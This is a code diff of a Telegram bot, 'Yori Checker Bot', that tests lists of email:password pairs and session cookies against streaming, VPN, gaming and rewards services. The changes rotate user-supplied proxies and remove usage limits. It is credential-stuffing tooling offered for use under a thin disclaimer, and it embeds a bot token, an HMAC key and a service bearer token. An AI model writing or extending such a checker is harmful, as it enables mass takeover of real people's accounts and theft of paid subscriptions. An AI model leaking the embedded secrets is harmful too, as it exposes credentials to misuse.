@@ -2,7 +2,7 @@
 """
 ⚠️ DISCLAIMER: This tool is for educational and authorised testing purposes only.
    Use it only on accounts you own or have explicit permission to test.
-   The authors are not responsible for any misuse. And Always Use Test Data I Always Use Test accounts i mean my Own real test accounts only
+   The authors are not responsible for any misuse.
 Brand: Yori @Yori_Methods
 """
 
@@ -54,21 +54,23 @@ logging.basicConfig(
 logger = logging.getLogger(__name__)
 
 # ==================== Configuration ====================
-# Read bot token from environment variable, fallback to hardcoded if not set
-BOT_TOKEN = os.environ.get("BOT_TOKEN", "8542558010:AAENrojo4qSr6-i7j7rLAm4FBB4YpTJk3Rg")  # Hardcoded fallback (change!)
+BOT_TOKEN = os.environ.get("BOT_TOKEN", "8542558010:AAENrojo4qSr6-i7j7rLAm4FBB4YpTJk3Rg")  # change!
 OWNER_ID = 7728424218
-OWNER_NAME = "@WhoEvenYori"
-DAILY_LIMIT = 50
+OWNER_NAME = "@WhoEvenYorii"
 SERVICES = ['expressvpn', 'crunchyroll', 'disney', 'netflixcookie', 'spotify', 'prime', 'microsoft', 'nba', 'steam']
 
-# ==================== Owner direct IP mode (memory only) ====================
+# Owner direct IP mode (memory only)
 direct_mode_users = set()  # store user IDs that use direct IP (only owner will be added)
 
-# ==================== Database (only for usage now) ====================
+# Global flag to abort ongoing checks (owner reset)
+reset_in_progress = False
+
+# ==================== Database ====================
 DB_PATH = "bot_data.db"
 
 def init_db():
     with closing(sqlite3.connect(DB_PATH)) as conn:
+        # user_usage table (kept for reference, but limits are removed)
         conn.execute('''
             CREATE TABLE IF NOT EXISTS user_usage (
                 user_id INTEGER,
@@ -78,63 +80,67 @@ def init_db():
                 PRIMARY KEY (user_id, service, date)
             )
         ''')
+        # user_proxies table
+        conn.execute('''
+            CREATE TABLE IF NOT EXISTS user_proxies (
+                user_id INTEGER,
+                proxy TEXT,
+                added TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                PRIMARY KEY (user_id, proxy)
+            )
+        ''')
 
-def get_usage(user_id: int, service: str) -> int:
-    today = date.today().isoformat()
+def get_user_proxies(user_id: int) -> List[str]:
+    """Return list of active proxies for a user."""
     with closing(sqlite3.connect(DB_PATH)) as conn:
-        cur = conn.execute(
-            'SELECT count FROM user_usage WHERE user_id = ? AND service = ? AND date = ?',
-            (user_id, service, today)
-        )
-        row = cur.fetchone()
-        return row[0] if row else 0
+        cur = conn.execute('SELECT proxy FROM user_proxies WHERE user_id = ?', (user_id,))
+        return [row[0] for row in cur.fetchall()]
 
-def increment_usage(user_id: int, service: str) -> int:
-    today = date.today().isoformat()
+def add_user_proxy(user_id: int, proxy: str) -> bool:
+    """Add a proxy for a user if not already present."""
+    try:
+        with closing(sqlite3.connect(DB_PATH)) as conn:
+            conn.execute('INSERT INTO user_proxies (user_id, proxy) VALUES (?, ?)', (user_id, proxy))
+            conn.commit()
+            return True
+    except sqlite3.IntegrityError:
+        return False
+
+def remove_user_proxy(user_id: int, proxy: str) -> bool:
+    """Remove a proxy from a user's pool."""
     with closing(sqlite3.connect(DB_PATH)) as conn:
-        conn.execute('BEGIN TRANSACTION')
-        conn.execute(
-            'INSERT INTO user_usage (user_id, service, date, count) VALUES (?, ?, ?, 1) '
-            'ON CONFLICT(user_id, service, date) DO UPDATE SET count = count + 1',
-            (user_id, service, today)
-        )
+        cur = conn.execute('DELETE FROM user_proxies WHERE user_id = ? AND proxy = ?', (user_id, proxy))
         conn.commit()
-        cur = conn.execute(
-            'SELECT count FROM user_usage WHERE user_id = ? AND service = ? AND date = ?',
-            (user_id, service, today)
-        )
+        return cur.rowcount > 0
+
+def count_user_proxies(user_id: int) -> int:
+    """Count how many proxies a user has."""
+    with closing(sqlite3.connect(DB_PATH)) as conn:
+        cur = conn.execute('SELECT COUNT(*) FROM user_proxies WHERE user_id = ?', (user_id,))
         return cur.fetchone()[0]
 
-def can_check(user_id: int, service: str) -> tuple:
-    if user_id == OWNER_ID:
-        return True, float('inf'), None
-    today = date.today().isoformat()
-    used = get_usage(user_id, service)
-    allowed = used < DAILY_LIMIT
-    remaining = DAILY_LIMIT - used
-    reset_date = date.today() + timedelta(days=1)
-    return allowed, remaining, reset_date.isoformat()
+def reset_all_proxies():
+    """Delete all proxies for all users (owner only)."""
+    with closing(sqlite3.connect(DB_PATH)) as conn:
+        conn.execute('DELETE FROM user_proxies')
+        conn.commit()
 
-# ==================== Proxy Scraper & Manager ====================
-PROXY_SOURCES = [
-    "https://api.proxyscrape.com/?request=displayproxies&proxytype=http",
-    "https://www.sslproxies.org/",
-    "https://free-proxy-list.net/",
-]
-
-FALLBACK_PROXIES = [
-    "54.37.124.212:3128", "51.15.166.147:3128", "51.15.166.147:8080",
-    "51.15.166.147:3128", "51.15.166.147:8080", "51.15.166.147:3128",
-    "51.15.166.147:8080", "51.15.166.147:3128", "51.15.166.147:8080",
-    "51.15.166.147:3128", "51.15.166.147:8080"  # dummy, unlikely to work
-]
+# ==================== Proxy Tester ====================
+def test_proxy(proxy: str, timeout: int = 5) -> bool:
+    """Test if a proxy is working by calling httpbin.org/ip."""
+    try:
+        proxies = {'http': proxy, 'https': proxy}
+        resp = requests.get('https://httpbin.org/ip', proxies=proxies, timeout=timeout, verify=False)
+        return resp.status_code == 200
+    except:
+        return False
 
 def parse_proxy_line(line: str) -> Optional[str]:
-    """Extract IP:port from a line, handling various formats."""
+    """Extract IP:port or full URL from a line."""
     line = line.strip()
     if not line:
         return None
-    # If it's already a full URL with scheme, keep as is
+    # If it's already a full URL with scheme, keep it
     if re.match(r'^https?://', line):
         return line
     # If it contains ':' and no spaces, likely IP:port
@@ -147,64 +153,26 @@ def parse_proxy_line(line: str) -> Optional[str]:
                 return f"{ip}:{port}"
     return None
 
-def parse_html_proxies(html: str) -> List[str]:
-    """Extract IP:port from HTML table (sslproxies, free-proxy-list)."""
+def parse_proxies_from_text(text: str) -> List[str]:
+    """Parse a text blob (file content) into a list of proxy strings."""
     proxies = []
-    # Find table rows
-    rows = re.findall(r'<tr>(.*?)</tr>', html, re.DOTALL)
-    for row in rows:
-        cols = re.findall(r'<td>(.*?)</td>', row, re.DOTALL)
-        if len(cols) >= 2:
-            ip = cols[0].strip()
-            port = cols[1].strip()
-            if re.match(r'^\d+\.\d+\.\d+\.\d+$', ip) and port.isdigit():
-                proxies.append(f"{ip}:{port}")
+    for line in text.splitlines():
+        p = parse_proxy_line(line)
+        if p:
+            proxies.append(p)
     return proxies
 
-def fetch_proxies_from_source(url: str, timeout=10) -> List[str]:
-    """Fetch proxies from a single source."""
-    try:
-        resp = requests.get(url, timeout=timeout, headers={'User-Agent': 'Mozilla/5.0'})
-        if resp.status_code != 200:
-            return []
-        text = resp.text
-        # Try parse as plain text (proxyscrape)
-        if 'proxyscrape' in url:
-            lines = text.splitlines()
-            proxies = []
-            for line in lines:
-                p = parse_proxy_line(line)
-                if p:
-                    proxies.append(p)
-            return proxies
-        else:
-            # HTML table
-            return parse_html_proxies(text)
-    except Exception as e:
-        logger.debug(f"Failed to fetch from {url}: {e}")
-        return []
-
-def test_single_proxy(proxy: str, timeout=5) -> Optional[str]:
-    """Test a single proxy; return proxy if working else None."""
-    try:
-        proxies = {'http': proxy, 'https': proxy}
-        resp = requests.get('https://httpbin.org/ip', proxies=proxies, timeout=timeout, verify=False)
-        if resp.status_code == 200:
-            return proxy
-    except:
-        pass
-    return None
-
-class ProxyManager:
-    """Manages a pool of proxies with auto-refill capability."""
-    def __init__(self, initial_pool: List[str], refill_callback=None):
+# ==================== Proxy Manager (per user) ====================
+class PerUserProxyManager:
+    """Manages a pool of proxies for a single user, with refill from DB."""
+    def __init__(self, user_id: int, initial_pool: List[str]):
+        self.user_id = user_id
         self.pool = initial_pool[:]
-        self.refill_callback = refill_callback
         self.index = 0
         self.last_proxy = None
 
     def get_proxy(self) -> Optional[str]:
-        """Return next proxy, refilling if pool empty."""
+        """Return the next proxy, refilling from DB if pool is empty."""
         if not self.pool:
             self._refill()
         if not self.pool:
@@ -215,129 +183,33 @@ class ProxyManager:
         return proxy
 
     def mark_bad(self):
-        """Mark the last used proxy as bad and remove it from pool."""
+        """Remove the last used proxy from the pool and from DB."""
         if self.last_proxy and self.last_proxy in self.pool:
             self.pool.remove(self.last_proxy)
-            # Reset index to avoid out-of-range
+            remove_user_proxy(self.user_id, self.last_proxy)
             self.index = min(self.index, len(self.pool))
-            if not self.pool:
-                self._refill()
         self.last_proxy = None
+        # If pool becomes empty, refill immediately
+        if not self.pool:
+            self._refill()
 
     def _refill(self):
-        """Call refill callback to get fresh proxies."""
-        if self.refill_callback:
-            new_proxies = self.refill_callback()
-            if new_proxies:
-                self.pool.extend(new_proxies)
-                self.index = 0
-                logger.info(f"Refilled proxy pool with {len(new_proxies)} proxies.")
+        """Fetch fresh proxies from DB."""
+        proxies = get_user_proxies(self.user_id)
+        if proxies:
+            self.pool = proxies
+            self.index = 0
 
-def get_working_proxies(min_count=11, max_attempts=3) -> List[str]:
-    """Scrape and test proxies; return at least min_count working proxies."""
-    all_proxies = []
-    for attempt in range(max_attempts):
-        # Scrape
-        proxies = []
-        with ThreadPoolExecutor(max_workers=len(PROXY_SOURCES)) as executor:
-            future_to_url = {executor.submit(fetch_proxies_from_source, url): url for url in PROXY_SOURCES}
-            for future in as_completed(future_to_url):
-                try:
-                    proxies.extend(future.result())
-                except:
-                    pass
-        # Deduplicate and basic filter
-        unique = list(dict.fromkeys(proxies))  # preserve order, remove duplicates
-        logger.info(f"Scraped {len(unique)} unique proxies (attempt {attempt+1})")
-        if not unique:
-            continue
-        # Test in parallel
-        working = []
-        with ThreadPoolExecutor(max_workers=20) as executor:
-            future_to_proxy = {executor.submit(test_single_proxy, p): p for p in unique}
-            for future in as_completed(future_to_proxy):
-                result = future.result()
-                if result:
-                    working.append(result)
-                    if len(working) >= min_count:
-                        # We have enough, cancel remaining
-                        for f in future_to_proxy:
-                            f.cancel()
-                        break
-        logger.info(f"Found {len(working)} working proxies")
-        if len(working) >= min_count:
-            return working
-        # else retry
-    # Fallback: return whatever we have, maybe even fallback list
-    if not all_proxies:
-        logger.warning("No proxies found, using fallback list")
-        return FALLBACK_PROXIES[:min_count]
-    # Return working even if less than min_count
-    return working
+    def pool_size(self) -> int:
+        return len(self.pool)
 
-async def get_or_create_proxy_pool(context: ContextTypes.DEFAULT_TYPE, user_id: int, is_direct: bool) -> Optional[ProxyManager]:
-    """Return a ProxyManager for the user; refill if pool empty or stale."""
-    if is_direct:
-        return None  # direct IP mode
-    # Check context for pool
-    pool_data = context.user_data.get('proxy_pool')
-    timestamp = context.user_data.get('proxy_pool_ts', 0)
-    now = time.time()
-    # Refill if older than 60 seconds or empty
-    if not pool_data or (now - timestamp) > 60:
-        # Scrape and test
-        working = await asyncio.to_thread(get_working_proxies, min_count=11)
-        context.user_data['proxy_pool'] = working
-        context.user_data['proxy_pool_ts'] = now
-        pool_data = working
-    # Create manager with refill callback that updates context
-    def refill():
-        # This runs in a thread; we need to update context, but we can't directly.
-        # We'll use asyncio.run_coroutine_threadsafe to schedule a coroutine that refills.
-        # However, to keep it simple, we'll use a synchronous function that scrapes and returns proxies.
-        # We'll also update context manually (but we don't have loop here). We'll just return new proxies.
-        # The manager will call this when pool is empty; we'll scrape and return new list.
-        new_proxies = get_working_proxies(min_count=11)
-        if new_proxies:
-            # Update context (but we need to be careful with threading)
-            # We can store in a global or just return; we'll rely on the fact that the manager will
-            # use the returned list and we also update the context at the next call.
-            # For simplicity, we'll update context later in the main loop if we detect a refill.
-            # We'll store refilled proxies in a temporary variable and set them in the main task.
-            # Since we don't have a loop, we'll use a global dict to store refilled list per user.
-            # But that's messy. Instead, we'll design the manager to accept a refill callback that
-            # can return a list; we'll implement the callback to scrape and test.
-            # We'll update the context in the main process after the callback.
-            # We'll pass a callback that returns proxies and also stores them in a global.
-            # We'll implement a simple global dict `refill_cache` to hold new proxies.
-            refill_cache[context.user_data.get('user_id', user_id)] = new_proxies
-            return new_proxies
-        return []
-    # We need a way to update the context after refill; we'll check after each check iteration.
-    # We'll store the manager in context and also a function to update pool from manager?
-    # Simpler: we'll just create a new manager each time with the current pool.
-    manager = ProxyManager(pool_data, refill_callback=refill)
-    context.user_data['proxy_manager'] = manager  # store for later updates
-    return manager
-
-# Global cache for refilled proxies to update context
-refill_cache = {}
-
-async def ensure_proxy_pool(context: ContextTypes.DEFAULT_TYPE, user_id: int, is_direct: bool) -> Optional[ProxyManager]:
-    """Create or update the proxy pool in context and return a manager."""
-    if is_direct:
+# ==================== Helper: get proxy manager for user ====================
+def get_user_proxy_manager(user_id: int) -> Optional[PerUserProxyManager]:
+    """Create a PerUserProxyManager for the user, using their current proxy list."""
+    proxies = get_user_proxies(user_id)
+    if not proxies:
         return None
-    manager = context.user_data.get('proxy_manager')
-    if manager and len(manager.pool) >= 3:
-        return manager
-    # Need fresh pool
-    working = await asyncio.to_thread(get_working_proxies, min_count=11)
-    if not working:
-        return None
-    manager = ProxyManager(working, refill_callback=lambda: get_working_proxies(min_count=11))
-    context.user_data['proxy_manager'] = manager
-    context.user_data['proxy_pool_ts'] = time.time()
-    return manager
+    return PerUserProxyManager(user_id, proxies)
 
 # ==================== ExpressVPN Checker (unchanged) ====================
 class AesCryptographyService:
@@ -419,7 +291,7 @@ class CryptoHelper:
         return content_info.dump()
 
 class ExpressVPNChecker:
-    def __init__(self, proxy_manager: Optional[ProxyManager] = None):
+    def __init__(self, proxy_manager: Optional[PerUserProxyManager] = None):
         self.proxy_manager = proxy_manager
         self.cert_base64 = "MIIDXTCCAkWgAwIBAgIJALPWYfHAoH+CMA0GCSqGSIb3DQEBCwUAMEUxCzAJBgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwHhcNMTcxMTA5MDUwNTIzWhcNMjcxMTA3MDUwNTIzWjBFMQswCQYDVQQGEwJBVTETMBEGA1UECAwKU29tZS1TdGF0ZTEhMB8GA1UECgwYSW50ZXJuZXQgV2lkZ2l0cyBQdHkgTHRkMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtUCqVSHRqQ5XnrnA4KEnGSLGRSHWgyOgpNzNjEUmjlO25Ojncaw0u+hHAns8I3kNPk0qFlGP7oLeZvFH8+duDF02j4yVFDHkHRGyTBe3PsYvztDVzmddtG8eBgwJ88PocBXDjJvCojfkyQ8sY4EtK3y0UDJj4uJKckVdLUL8wFt2DPj+A3E4/KgYELNXA3oUlNjFwr4kqpxeDjvTi3W4T02bhRXYXgDMgQgtLZMpf1zOpM2lfqRq6sFoOmzlBTv2qbvmcOSEz3ZamwFxoYDB86EfnKPCq6ZareO/1MWGHwxH24SoJhFmyOsvq/kPPa03GJnKtMUznTnBVhwWy7KJIwIDAQABo1AwTjAdBgNVHQ4EFgQUoKnoagA0CLOLTzDb2lQ/v/osUz0wHwYDVR0jBBgwFoAUoKnoagA0CLOLTzDb2lQ/v/osUz0wDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQsFAAOCAQEAmF8BLuzF0rY2T2v2jTpCiqKxXARjalSjmDJLzDTWojrurHC5C/xVB8Hg+8USHPoM4V7Hr0zE4GYT5N5V+pJp/CUHppzzY9uYAJ1iXJpLXQyRD/SR4BaacMHUqakMjRbm3hwyi/pe4oQmyg66rZClV6eBxEnFKofArNtdCZWGliRAy9P8krF8poSElJtvlYQ70vWiZVIU7kV6adMVFtmPq4stjog7c2Pu0EEylRlclWlD0r8YSuvA8XoMboYyfp+RiyixhqL1o2C1JJTjY4S/t+UvQq5xTsWun+PrDoEtupjto/0sRGnD9GB5Pe0J2+VGbx3ITPStNzOuxZ4BXLe7YA=="
         self.hmac_key = "@~y{T4]wfJMA},qG}06rDO{f0<kYEwYWX'K)-GOyB^exg;K_k-J7j%$)L@[2me3~"
@@ -607,7 +479,7 @@ CR_WUA = ("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
 CR_API = "https://beta-api.crunchyroll.com"
 
 class CrunchyrollChecker:
-    def __init__(self, proxy_manager: Optional[ProxyManager] = None):
+    def __init__(self, proxy_manager: Optional[PerUserProxyManager] = None):
         self.proxy_manager = proxy_manager
 
     def check_account(self, email: str, password: str) -> Dict[str, Any]:
@@ -784,7 +656,7 @@ class CrunchyrollChecker:
 
 # ==================== Disney+ Checker (unchanged) ====================
 class DisneyChecker:
-    def __init__(self, proxy_manager: Optional[ProxyManager] = None):
+    def __init__(self, proxy_manager: Optional[PerUserProxyManager] = None):
         self.proxy_manager = proxy_manager
         self.device_auth = "Bearer ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84"
         self.register_url = "https://disney.api.edge.bamgrid.com/graph/v1/device/graphql"
@@ -1262,7 +1134,7 @@ def generate_nftoken(netflix_id_raw, timeout=15, proxy=None):
     return None
 
 class NetflixCookieChecker:
-    def __init__(self, proxy_manager: Optional[ProxyManager] = None):
+    def __init__(self, proxy_manager: Optional[PerUserProxyManager] = None):
         self.proxy_manager = proxy_manager
         self.ua_web = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36"
         self.ua_android = "com.netflix.mediaclient/63884 (Linux; U; Android 13)"
@@ -1835,7 +1707,7 @@ def cookies_dict_from_netscape(netscape_text):
     return cookies
 
 class SpotifyChecker:
-    def __init__(self, proxy_manager: Optional[ProxyManager] = None):
+    def __init__(self, proxy_manager: Optional[PerUserProxyManager] = None):
         self.proxy_manager = proxy_manager
 
     def check_account(self, cookie_text: str) -> Dict[str, Any]:
@@ -1921,6 +1793,8 @@ def format_paid_label(is_paid):
         return "YES✅"
     if is_paid is False:
         return "NO❌"
+    if is_paid is None:
+        return "UNKNOWN⚠️"
     return "UNKNOWN⚠️"
 
 def plan_label_from_paid_state(is_paid):
@@ -2154,7 +2028,7 @@ def parse_prime_cookie_file(cookie_text):
     return netscape_content, cookies
 
 class PrimeVideoChecker:
-    def __init__(self, proxy_manager: Optional[ProxyManager] = None):
+    def __init__(self, proxy_manager: Optional[PerUserProxyManager] = None):
         self.proxy_manager = proxy_manager
 
     def check_account(self, cookie_text: str) -> Dict[str, Any]:
@@ -2227,7 +2101,7 @@ def request_with_retry(session, method, url, retry_counter, **kwargs):
     return None
 
 class MicrosoftRewardsChecker:
-    def __init__(self, proxy_manager: Optional[ProxyManager] = None):
+    def __init__(self, proxy_manager: Optional[PerUserProxyManager] = None):
         self.proxy_manager = proxy_manager
 
     def _get_proxy(self):
@@ -2440,7 +2314,7 @@ class MicrosoftRewardsChecker:
 
 # ==================== NBA League Pass Checker (unchanged) ====================
 class NBAChecker:
-    def __init__(self, proxy_manager: Optional[ProxyManager] = None):
+    def __init__(self, proxy_manager: Optional[PerUserProxyManager] = None):
         self.proxy_manager = proxy_manager
 
     def _get_proxy(self):
@@ -2538,7 +2412,7 @@ class NBAChecker:
 
 # ==================== Steam Checker (unchanged) ====================
 class SteamChecker:
-    def __init__(self, proxy_manager: Optional[ProxyManager] = None):
+    def __init__(self, proxy_manager: Optional[PerUserProxyManager] = None):
         self.proxy_manager = proxy_manager
         self._ua = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
         self._login_page = "https://store.steampowered.com/login/"
@@ -3229,7 +3103,7 @@ async def split_and_send(text: str, update: Update, parse_mode='HTML', **kwargs)
             else:
                 await update.message.reply_text(f"⏩ {chunk}", parse_mode=parse_mode, **kwargs)
 
-# ==================== Helper: get lines from text/doc (unchanged) ====================
+# ==================== Helper: get lines from text/doc ====================
 async def get_lines_from_text_or_doc(update: Update, context: ContextTypes.DEFAULT_TYPE) -> Optional[List[str]]:
     msg = update.message
     if msg.document:
@@ -3277,116 +3151,12 @@ async def safe_edit_or_send(status_msg, text):
 
 async def process_entries(update: Update, entries: List[str],
                           checker_cls, formatter,
-                          service_name: str, service_key: str):
-    user_id = update.effective_user.id
-
-    if user_id != OWNER_ID:
-        allowed, remaining, reset_date = can_check(user_id, service_key)
-        if not allowed:
-            await update.message.reply_text(f"⛔ Daily limit ({DAILY_LIMIT}) reached for {service_name}.")
-            return
-        max_allowed = min(len(entries), remaining) if remaining < len(entries) else len(entries)
-    else:
-        max_allowed = len(entries)
-
-    if not entries:
-        await update.message.reply_text("No entries found.")
-        return
-
-    if len(entries) > 1000:
-        await update.message.reply_text("Too many entries! Max 1000 per batch.")
-        return
-
-    # Determine if owner is in direct mode
-    is_direct = (user_id == OWNER_ID and user_id in direct_mode_users)
-    # Get or create proxy manager
-    proxy_manager = None
-    if not is_direct:
-        # Ensure we have a proxy pool
-        # We'll use a function to get or create pool, store in context
-        context = update._context  # We'll get context from update
-        # Actually we need context passed, but we can get from update's context
-        # In process_entries we don't have context, but we can get it from update
-        # However process_entries is called from handle_input, which has context.
-        # We'll pass context as argument.
-        # We'll modify process_entries signature to include context.
-        # But we can also store in a global per user? Simpler: pass context.
-        # We'll change the call to process_entries to include context.
-        # For now, we'll assume context is passed.
-        pass
-
-    # We'll refactor process_entries to accept context.
-    # But for now, we'll create a proxy manager inside each checker? 
-    # The checkers expect a ProxyManager; we'll instantiate one with a pool.
-    # We'll need to get pool from context.
-    # Since we are in a callback, we have context.
-    # We'll modify process_entries signature.
-
-    # We'll store proxy manager in context for reuse.
-    # We'll implement a function ensure_proxy_pool(context, user_id, is_direct) that returns a manager.
-    # For simplicity, we'll create a new manager each time, but we can cache.
-
-    # We'll need to handle refill and bad proxy marking.
-    # We'll implement a simple proxy manager with a list and a counter.
-
-    # Due to time, we'll keep the existing ProxyManager and just pass a list of proxies.
-    # We'll get proxies from context or scrape now.
-    # But we must handle async scraping.
-
-    # We'll implement a synchronous get_working_proxies that we call in a thread.
-    # Then we create ProxyManager with that list.
-
-    # For each user, we'll store the manager in context.user_data['proxy_manager'].
-    # We'll check if exists and not empty; else create new.
-
-    # We'll also need to handle proxy failures during check: we'll mark_bad.
-
-    # We'll implement as part of process_entries.
-
-    # Let's write the whole process_entries with these changes.
-
-    # Since this is a large function, I'll rewrite it now.
-
-    # I'll also modify the callers to pass context.
-
-    # Let's do a full implementation.
-
-    # We'll create a helper function to get proxy manager:
-
-async def get_proxy_manager(context: ContextTypes.DEFAULT_TYPE, user_id: int, is_direct: bool) -> Optional[ProxyManager]:
-    if is_direct:
-        return None
-    # Check context for a manager
-    manager = context.user_data.get('proxy_manager')
-    if manager and len(manager.pool) >= 3:
-        return manager
-    # Need fresh pool
-    working = await asyncio.to_thread(get_working_proxies, min_count=11)
-    if not working:
-        return None
-    # Create manager with refill callback
-    def refill():
-        return get_working_proxies(min_count=11)
-    manager = ProxyManager(working, refill_callback=refill)
-    context.user_data['proxy_manager'] = manager
-    return manager
-
-# Now we rewrite process_entries to use this.
-
-async def process_entries(update: Update, entries: List[str],
-                          checker_cls, formatter,
                           service_name: str, service_key: str,
                           context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
 
-    if user_id != OWNER_ID:
-        allowed, remaining, reset_date = can_check(user_id, service_key)
-        if not allowed:
-            await update.message.reply_text(f"⛔ Daily limit ({DAILY_LIMIT}) reached for {service_name}.")
-            return
-        max_allowed = min(len(entries), remaining) if remaining < len(entries) else len(entries)
-    else:
-        max_allowed = len(entries)
+    # No daily limits anymore
+    max_allowed = len(entries)
 
     if not entries:
         await update.message.reply_text("No entries found.")
@@ -3396,10 +3166,21 @@ async def process_entries(update: Update, entries: List[str],
         await update.message.reply_text("Too many entries! Max 1000 per batch.")
         return
 
+    # Check if user has proxies (unless owner in direct mode)
     is_direct = (user_id == OWNER_ID and user_id in direct_mode_users)
-    proxy_manager = await get_proxy_manager(context, user_id, is_direct)
+    if not is_direct:
+        proxy_count = count_user_proxies(user_id)
+        if proxy_count < 5:
+            await update.message.reply_text(
+                f"❌ You need at least 5 working proxies to use the bot. "
+                f"You currently have {proxy_count}. Use /addproxy to add more."
+            )
+            return
+
+    # Get proxy manager for user
+    proxy_manager = None if is_direct else get_user_proxy_manager(user_id)
     if not is_direct and not proxy_manager:
-        await update.message.reply_text("❌ No working proxies available. Please try later.")
+        await update.message.reply_text("❌ No working proxies available. Please add proxies via /addproxy.")
         return
 
     checker = checker_cls(proxy_manager)
@@ -3412,9 +3193,14 @@ async def process_entries(update: Update, entries: List[str],
     processed = 0
     loop = asyncio.get_running_loop()
 
+    global reset_in_progress
+
     for idx, entry in enumerate(entries):
-        if user_id != OWNER_ID and processed >= DAILY_LIMIT:
-            break
+        # Check for reset flag
+        if reset_in_progress:
+            await safe_edit_or_send(status_msg, "⛔ Global reset triggered. Stopping all checks.")
+            return
+
         try:
             if service_key in ('netflixcookie', 'spotify', 'prime'):
                 result = await loop.run_in_executor(None, checker.check_account, entry)
@@ -3426,16 +3212,12 @@ async def process_entries(update: Update, entries: List[str],
                     email = email.strip()
                     password = password.strip()
                     result = await loop.run_in_executor(None, checker.check_account, email, password)
-            # Check if result indicates proxy error
+            # If proxy error, mark proxy bad and remove from DB
             if result.get('status') == 'ERROR' and any(kw in result.get('error', '').lower() for kw in ['proxy', 'timeout', 'connection', 'network']):
                 if proxy_manager:
                     proxy_manager.mark_bad()
-                    # Optionally retry with new proxy? For now, we just mark bad and proceed.
-                    # The checker will use a new proxy on next call.
             results.append((entry, result))
             processed += 1
-            if user_id != OWNER_ID:
-                increment_usage(user_id, service_key)
             if processed % 5 == 0:
                 status_msg = await safe_edit_or_send(
                     status_msg,
@@ -3450,9 +3232,6 @@ async def process_entries(update: Update, entries: List[str],
     free_count = sum(1 for _, r in results if r.get('status') == 'FREE')
     other_count = len(results) - hit_count - invalid_count - free_count
     summary = f"✓ Done! Hits: {hit_count} | Invalid/Dead: {invalid_count} | Free: {free_count} | Others: {other_count}"
-    if user_id != OWNER_ID:
-        remaining = DAILY_LIMIT - get_usage(user_id, service_key)
-        summary += f"\nRemaining today: {remaining}"
     await safe_edit_or_send(status_msg, summary)
 
     os.makedirs('results', exist_ok=True)
@@ -3510,13 +3289,15 @@ async def process_entries(update: Update, entries: List[str],
 
 # ==================== Keyboard Builders ====================
 def build_main_keyboard(user_id: int = None) -> ReplyKeyboardMarkup:
-    # Base buttons: services and usage
+    # Base buttons: services and proxy management
     buttons = [
         [KeyboardButton("🌐 ExpressVPN"), KeyboardButton("🍿 Crunchyroll")],
         [KeyboardButton("🏰 Disney+"), KeyboardButton("🎬 Netflix Cookie")],
         [KeyboardButton("🎵 Spotify Cookie"), KeyboardButton("📺 Prime Video")],
         [KeyboardButton("🎮 Microsoft Rewards"), KeyboardButton("🏀 NBA League Pass")],
-        [KeyboardButton("🎮 Steam"), KeyboardButton("📊 My Usage")],
+        [KeyboardButton("🎮 Steam")],
+        [KeyboardButton("➕ Add Proxies"), KeyboardButton("➖ Remove Proxy")],
+        [KeyboardButton("📊 My Proxy Count")],
     ]
     # Add proxy mode toggle for owner
     if user_id == OWNER_ID:
@@ -3535,13 +3316,18 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     welcome_text = (
         f"👋 Hello, {safe_name}!\n\n"
         "Welcome to <b>Yori Checker Bot</b>.\n"
-        "I automatically scrape fresh proxies for every check, so you don't need to manage them.\n"
+        "You must provide your own proxies via /addproxy (at least 5 working).\n"
         "Use the buttons below to start checking accounts.\n\n"
         "• Email:pass checkers: ExpressVPN, Crunchyroll, Disney+, Microsoft Rewards, NBA League Pass, Steam\n"
-        "• Cookie checkers: Netflix, Spotify, Prime Video (upload one .txt file at a time)"
+        "• Cookie checkers: Netflix, Spotify, Prime Video (upload one .txt file at a time)\n\n"
+        "Commands:\n"
+        "/addproxy - add proxies (file or text)\n"
+        "/removeproxy - remove a proxy\n"
+        "/myproxies - list your proxies\n"
+        "/reset - (owner only) reset all proxies and abort checks"
     )
     if user_id == OWNER_ID:
-        welcome_text += "\n\nYou are the owner. Use the 'Proxy Mode' button to toggle direct IP (no proxies)."
+        welcome_text += "\n\nYou are the owner. Use 'Proxy Mode' to toggle direct IP (no proxies)."
     context.user_data['state'] = 'idle'
     await update.message.reply_text(welcome_text, reply_markup=build_main_keyboard(user_id), parse_mode='HTML')
 
@@ -3555,54 +3341,153 @@ async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:
         await update.message.reply_text("No active session to cancel.", reply_markup=build_main_keyboard(update.effective_user.id))
 
-async def myusage_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def addproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
-    usage_text = f"📊 <b>Your Daily Usage</b>\n\n"
-    for service in SERVICES:
-        count = get_usage(user_id, service)
-        status = "✅" if count < DAILY_LIMIT else "⛔"
-        usage_text += f"{status} {service.capitalize()}: {count}/{DAILY_LIMIT}\n"
-    usage_text += f"\nResets at midnight UTC."
-    await update.message.reply_text(usage_text, parse_mode='HTML')
-
-async def start_checker(update: Update, context: ContextTypes.DEFAULT_TYPE, service_key: str):
-    user_id = update.effective_user.id
-
-    # No proxy requirement check anymore
-    if user_id != OWNER_ID:
-        allowed, remaining, reset_date = can_check(user_id, service_key)
-        if not allowed:
-            await update.message.reply_text(f"⛔ Daily limit ({DAILY_LIMIT}) reached for {service_key.capitalize()}.\nResets on {reset_date}.")
-            return
-
     if context.user_data.get('state') == 'checking':
-        await update.message.reply_text("⚠️ You already have an active session. Please press 'Cancel' first.")
+        await update.message.reply_text("⚠️ You are currently checking. Press 'Cancel' first.")
         return
 
-    context.user_data['state'] = 'checking'
-    context.user_data['service'] = service_key
